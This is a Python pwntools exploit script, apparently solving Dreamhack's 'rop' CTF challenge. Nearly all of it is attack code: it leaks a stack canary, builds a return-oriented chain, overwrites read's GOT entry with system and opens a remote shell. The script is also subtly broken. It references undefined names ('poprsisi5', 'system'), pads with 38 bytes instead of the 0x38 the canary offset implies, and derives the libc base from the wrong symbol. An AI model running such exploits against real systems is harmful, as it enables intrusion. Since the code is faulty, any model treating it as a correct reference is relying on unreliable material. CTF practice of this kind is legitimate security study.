# ropp
from pwn import *

def slog(name, addr): return success(': '.join([name, hex(addr)]))

p = remote('host3.dreamhack.games',19924)
e = ELF('rop')
libc = ELF('./libc.so.6')

# [1] Leak canary
buf = b'A'*0x39
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recvn(7))
slog('canary', cnry)

readplt=e.plt['read']
readgot=e.got['read']
wplt=e.plt['write']
poprdi=0x0000000000400853
poprsir15=0x0000000000400851
ret=0x0000000000400854

pl=b'A'*38+p64(cnry)+b'8'*0x8
pl+=p64(poprdi)+p64(1)
pl+=p64(poprsisi5)+p64(readgot)+p64(0)
pl+=p64(wplt)

pl += p64(poprdi) + p64(0)
pl += p64(poprsir15) + p64(readgot) + p64(0)
pl += p64(readplt)

pl += p64(poprdi)
pl += p64(readgot + 0x8)
pl += p64(ret)
pl += p64(readplt)

p.sendafter(b'Buf: ', pl)
read=u64(p.recvn(6)+b'\x00'*2)
lb=read-libc.symbols['system']
slog('read', read)
slog('libc_base', lb)
slog('system', system)

p.send(p64(system) + b'/bin/sh\x00')

p.interactive()